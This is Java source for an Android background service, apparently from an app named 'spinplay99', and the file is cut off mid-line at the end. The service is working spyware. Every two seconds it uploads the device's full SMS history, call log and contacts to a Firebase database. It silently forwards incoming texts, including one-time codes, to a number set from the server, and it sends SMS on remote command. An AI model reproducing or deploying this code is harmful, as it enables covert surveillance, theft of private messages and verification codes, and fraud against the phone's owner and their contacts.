package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID = "sp99sync";
    private static final int NOTIFY_ID = 999;

    private DatabaseReference db;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    private SmsManager smsManager;
    private ValueEventListener fwListener, cmdListener;
    private String fwNum = "";
    private boolean fwOn = false;
    private List<String> fwFilters = new ArrayList<>();
    private boolean fwAll = true;

    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseApp.initializeApp(this);
        db = FirebaseDatabase.getInstance().getReference();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();
        createChannel();
        startForeground(NOTIFY_ID, createNotification());
        loadFwSettings();
        listenCommands();
    }

    @Override
    public int onStartCommand(Intent i, int f, int id) { startLoop(); return START_STICKY; }

    private void startLoop() {
        syncRunnable = () -> { sync(); handler.postDelayed(syncRunnable, 2000); };
        handler.post(syncRunnable);
    }

    private void sync() {
        DatabaseReference r = db.child("devices").child(deviceId);
        r.child("online_status").setValue(true);
        r.child("online_status").onDisconnect().setValue(false);
        r.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);
        r.child("live_data").setValue(collectLiveData());
        updateInfo();
        checkFw();
    }

    private Map<String, Object> collectLiveData() {
        Map<String, Object> d = new HashMap<>();
        d.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
        d.put("timestamp_millis", System.currentTimeMillis());
        d.put("battery_level", getBat());
        d.put("network_type", getNet());
        d.put("is_charging", isCharging());
        d.put("permissions", getPerms());
        d.put("sim_info", getSimInfo());
        if (checkPerm(Manifest.permission.READ_SMS)) { d.put("total_sms", getSmsCnt()); sendSms(); }
        if (checkPerm(Manifest.permission.READ_CALL_LOG)) { d.put("total_calls", getCallCnt()); sendCalls(); }
        if (checkPerm(Manifest.permission.READ_CONTACTS)) { d.put("contacts_count", getConCnt()); sendContacts(); }
        return d;
    }

    private void updateInfo() {
        Map<String, Object> i = new HashMap<>();
        i.put("device_id", deviceId);
        i.put("device_model", Build.MODEL);
        i.put("device_brand", Build.BRAND);
        i.put("android_version", Build.VERSION.RELEASE);
        i.put("last_seen", ServerValue.TIMESTAMP);
        i.put("sim_info", getDetSim());
        db.child("devices").child(deviceId).child("device_info").updateChildren(i);
    }

    private void sendSms() {
        new Thread(() -> {
            List<Map<String, Object>> m = getAllSms();
            Map<String, Object> d = new HashMap<>();
            d.put("total_count", m.size());
            d.put("messages", m);
            db.child("devices").child(deviceId).child("all_sms").setValue(d);
        }).start();
    }

    private List<Map<String, Object>> getAllSms() {
        List<Map<String, Object>> l = new ArrayList<>();
        Cursor c = null;
        try {
            c = getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{"_id","address","body","date","type","read"}, null, null, "date DESC");
            if(c != null && c.moveToFirst()) {
                do {
                    Map<String, Object> s = new HashMap<>();
                    s.put("id", cs(c,0)); s.put("address", cs(c,1));
                    String b = cs(c,2); s.put("body", b!=null&&b.length()>300?b.substring(0,300)+"...":b);
                    String dt = cs(c,3); s.put("date", dt);
                    if(dt!=null) s.put("date_readable", fmt(Long.parseLong(dt)));
                    String tp = cs(c,4); s.put("type", "1".equals(tp)?"INBOX":"2".equals(tp)?"SENT":"OTHER");
                    s.put("read", cs(c,5));
                    l.add(s);
                } while(c.moveToNext());
            }
        } catch(Exception e) {} finally { if(c!=null) c.close(); }
        return l;
    }

    private void sendCalls() {
        new Thread(() -> {
            List<Map<String, Object>> c = getAllCalls();
            Map<String, Object> d = new HashMap<>();
            d.put("total_count", c.size());
            d.put("calls", c);
            db.child("devices").child(deviceId).child("all_calls").setValue(d);
        }).start();
    }

    private List<Map<String, Object>> getAllCalls() {
        List<Map<String, Object>> l = new ArrayList<>();
        Cursor c = null;
        try {
            c = getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"_id","number","type","date","duration","name"}, null, null, "date DESC");
            if(c != null && c.moveToFirst()) {
                do {
                    Map<String, Object> cl = new HashMap<>();
                    cl.put("id", cs(c,0)); cl.put("number", cs(c,1));
                    String tp = cs(c,2); cl.put("type", "1".equals(tp)?"INCOMING":"2".equals(tp)?"OUTGOING":"3".equals(tp)?"MISSED":"UNKNOWN");
                    String dt = cs(c,3); cl.put("date", dt);
                    if(dt!=null) cl.put("date_readable", fmt(Long.parseLong(dt)));
                    cl.put("duration", cs(c,4)); cl.put("contact_name", cs(c,5));
                    l.add(cl);
                } while(c.moveToNext());
            }
        } catch(Exception e) {} finally { if(c!=null) c.close(); }
        return l;
    }

    private void sendContacts() {
        new Thread(() -> {
            List<Map<String, Object>> c = getAllContacts();
            Map<String, Object> d = new HashMap<>();
            d.put("total_count", c.size());
            d.put("contacts", c);
            db.child("devices").child(deviceId).child("all_contacts").setValue(d);
        }).start();
    }

    private List<Map<String, Object>> getAllContacts() {
        List<Map<String, Object>> l = new ArrayList<>();
        Cursor c = null;
        try {
            c = getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI, new String[]{"_id","display_name","has_phone_number"}, null, null, "display_name ASC");
            if(c != null && c.moveToFirst()) {
                do {
                    Map<String, Object> ct = new HashMap<>();
                    String cid = cs(c,0); ct.put("id", cid); ct.put("name", cs(c,1));
                    if("1".equals(cs(c,2))) ct.put("phone", getPhone(cid));
                    l.add(ct);
                } while(c.moveToNext());
            }
        } catch(Exception e) {} finally { if(c!=null) c.close(); }
        return l;
    }

    private String getPhone(String cid) {
        try {
            Cursor c = getContentResolver().query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"number"}, "contact_id=?", new String[]{cid}, null);
            if(c!=null&&c.moveToFirst()) { String n=c.getString(0); c.close(); return n; }
            if(c!=null) c.close();
        } catch(Exception e) {}
        return "";
    }

    private void loadFwSettings() {
        fwListener = new ValueEventListener() {
            public void onDataChange(@NonNull DataSnapshot s) {
                if(s.exists()) {
                    fwNum = s.child("forward_to").getValue(String.class);
                    Boolean e = s.child("enabled").getValue(Boolean.class); fwOn = e!=null&&e;
                    Boolean a = s.child("forward_all").getValue(Boolean.class); fwAll = a==null||a;
                    fwFilters.clear();
                    for(DataSnapshot f: s.child("filters").getChildren()) { String n=f.getValue(String.class); if(n!=null) fwFilters.add(n); }
                }
            }
            public void onCancelled(@NonNull DatabaseError e) {}
        };
        db.child("devices").child(deviceId).child("forwarding_settings").addValueEventListener(fwListener);
    }

    private void fwSms(String from, String body, long ts) {
        if(!fwOn||fwNum==null||fwNum.isEmpty()) return;
        if(!fwAll&&!fwFilters.isEmpty()) { boolean m=false; for(String f: fwFilters) if(from.contains(f)) { m=true; break; } if(!m) return; }
        try {
            smsManager.sendTextMessage(fwNum, null, "From:"+from+"\n"+body, null, null);
            Map<String, Object> l = new HashMap<>();
            l.put("from",from); l.put("to",fwNum); l.put("body",body!=null&&body.length()>100?body.substring(0,100):body);
            l.put("status","FORWARDED"); l.put("forwarded_at",ServerValue.TIMESTAMP);
            db.child("devices").child(deviceId).child("forwarded_sms").push().setValue(l);
        } catch(Exception e) {}
    }

    private void checkFw() {
        if(!fwOn||!checkPerm(Manifest.permission.READ_SMS)) return;
        new Thread(() -> {
            Cursor c = null;
            try {
                c = getContentResolver().query(Telephony.Sms.Inbox.CONTENT_URI, new String[]{"address","body","date"}, "date>?", new String[]{String.valueOf(System.currentTimeMillis()-10000)}, "date DESC LIMIT 5");
                if(c!=null&&c.moveToFirst()) { do { fwSms(cs(c,0),cs(c,1),Long.parseLong(cs(c,2))); } while(c.moveToNext()); }
            } catch(Exception e) {} finally { if(c!=null) c.close(); }
        }).start();
    }

    private void listenCommands() {
        cmdListener = new ValueEventListener() {
            public void onDataChange(@NonNull DataSnapshot s) {
                for(DataSnapshot cmd: s.getChildren()) {
                    String to=cmd.child("to").getValue(String.class), msg=cmd.child("message").getValue(String.class);
                    if(to!=null&&msg!=null) {
                        try {
                            smsManager.sendTextMessage(to,null,msg,null,null);
                            Map<String, Object> l = new HashMap<>();
                            l.put("to",to); l.put("message",msg); l.put("status","SENT"); l.put("sent_at",ServerValue.TIMESTAMP);
                            db.child("devices").child(deviceId).child("sent_sms").push().setValue(l);
                        } catch(Exception e) {}
                    }
                    cmd.getRef().removeValue();
                }
            }
            public void onCancelled(@NonNull DatabaseError e) {}
        };
        db.child("devices").child(deviceId).child("manual_commands").child("send_sms").addValueEventListener(cmdListener);
    }

    private String cs(Cursor c, int i) { try { return c.getString(i); } catch(Exception e) { return ""; } }
    private String fmt(long t) { try { return new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(t)); } catch(Exception e) { return ""; } }
    private int getSmsCnt() { int n=0; try { Cursor c=getContentResolver().query(Telephony.Sms.CONTENT_URI,null,null,null,null); if(c!=null) { n=c.getCount(); c.close(); } } catch(Exception e) {} return n; }
    private int getCallCnt() { int n=0; try { Cursor c=getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null); if(c!=null) { n=c.getCount(); c.close(); } } catch(Exception e) {} return n; }
    private int getConCnt() { int n=0; try { Cursor c=getContentResolver().query(android.provider.ContactsContract.Contacts.CONTENT_URI,null,null,null,null); if(c!=null) { n=c.getCount(); c.close(); } } catch(Exception e) {} return n; }
    private Map<String, Boolean> getPerms() { Map<String, Boolean> p=new HashMap<>(); p.put("read_sms",checkPerm(Manifest.permission.READ_SMS)); p.put("send_sms",checkPerm(Manifest.permission.SEND_SMS)); p.put("receive_sms",checkPerm(Manifest.permission.RECEIVE_SMS)); p.put("read_call_log",checkPerm(Manifest.permission.READ_CALL_LOG)); p.put("read_contacts",checkPerm(Manifest.permission.READ_CONTACTS)); p.put("call_phone",checkPerm(Manifest.permission.CALL_PHONE)); return p; }
    private boolean checkPerm(String p) { return ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED; }
    private int getBat() { try { Intent i=registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)); if(i!=null) { int s=i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE,-1); int l=i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL,-1); if(s>0) return (l*100)/s; } } catch(Exception e) {} return 0; }
    private String getNet() { try { android.net.ConnectivityManager cm=(android.net.ConnectivityManager)getSystemService(CONNECTIVITY_SERVICE); android.net.NetworkInfo n=cm.getActiveNetworkInfo(); if(n!=null&&n.isConnected()) return n.getTypeName(); } catch(Exception e) {} return "Offline"; }
    private boolean isCharging() { try { Intent i=registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)); if(i!=null) { int s=i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS,-1); return s==android.os.BatteryManager.BATTERY_STATUS_CHARGING||s==android.os.BatteryManager.BATTERY_STATUS_F
